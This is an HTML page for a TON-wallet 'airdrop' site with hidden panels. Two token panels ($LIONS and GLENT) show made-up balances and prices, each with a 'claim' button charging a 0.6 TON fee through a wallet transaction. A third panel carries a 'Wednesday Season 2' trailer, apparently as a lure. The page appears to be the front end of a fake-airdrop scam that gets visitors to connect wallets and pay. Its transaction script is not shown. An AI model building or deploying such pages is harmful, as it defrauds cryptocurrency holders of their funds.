<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="./style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@ton/core@latest/dist/ton-core.umd.min.js"></script>

    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <script src="https://unpkg.com/tonweb@0.0.41/dist/tonweb.js"></script>

    <title>Airdrops</title>
</head>
<body>
    <div id="lions" class="hide">
        <div>
            <img id="lightlion" src="./images/lightLion.png"/>
            <div id="liontoken">

            </div>
            <p id="coinlions">56940 $LIONS</p>
            <button id="claimlionsAirdrop" onclick="sendTransaction()">Claim $LIONS (fee 0.6 TON)</button>

        </div>
    </div>
    <div id="glent" class="hide">
        <div>
            <header id="headerGlent">
                <img src="./images/glentA4BgRm.png" alt="" class="iconGl">
                <span>GLENT</span>
                <div id="connect" style="position: absolute; right: 10px"></div>
            </header>
            <div id="centerglent">
                <div class="flex align" style="margin-top: -50px; justify-content: center">
                    <p id="userglentcoin">20000</p>
                    <img src="./images/glentA4BgRm.png" alt="" class="iconGl">
                </div>
                <p style="color: white; font-size: 20px; margin-top: 10px" class="textC" id="textGlent">GLENT</p>
                <span id="tge">TGE DAY</span>
                <div class="textC">
                    <img src="./images/glentA4BgRm.png" alt="" class="iconGl">
                    <p style="font-weight: 100;font-size: 12px;">Assets You Will Own</p>
                    <div class="flex" style="justify-content: center">
                        <div style="background-color: #0a84ff; width: 60px; height: 2px; border-radius: 5px"></div>
                    </div>
                    <div>
                        <p  style="font-weight: 100">Token Price</p>
                        <p>1 GLENT = $0.004</p>
                        <br>

                        <p  style="font-weight: 100">Total GLENT Value</p>
                        <p style="color: green">$ <span id="totalGlent">0</span> USDT</p>
                        <br>

                    </div>

                </div>
                <div style="margin-left: 37px">
                    <p style="font-weight: 100; font-size: 10px;">Listing Date</p>
                    <div id="listingslist">

                    </div>
                    <div style="width: 100%; height: 3px; background-color: white"></div>
                </div>


                <br>
                <div class="textC">
                    <p style="font-weight: 100; font-size: 10px">Instantly transfer your assets to your wallet.</p>
                    <br>
                    <button id="claimGlent">CLAIM NOW (fee 0.6 ton)</button>
                </div>
            </div>
            <div id="mainGlent">

            </div>
            <div id="bottomGlent">

            </div>

        </div>
    </div>
    <div id="wednesday" class="hide">
        <div style="position: relative; height: 40px">
            <div id="connect2">

            </div>
        </div>
        <div class="justifyCenter">
            <div id="mainImg" class="rgb-shadow">
                <img src="./images/season2Img.png" alt="img">
            </div>
            <iframe width="80%"
                    src="https://www.youtube.com/embed/uQx8jKiIDTI"
                    title="Wednesday Season 2 Trailer"
                    frameborder="0"
                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                    allowfullscreen>
            </iframe>
        </div>
    </div>

    <script src="./script.js"></script>
</body>
</html>
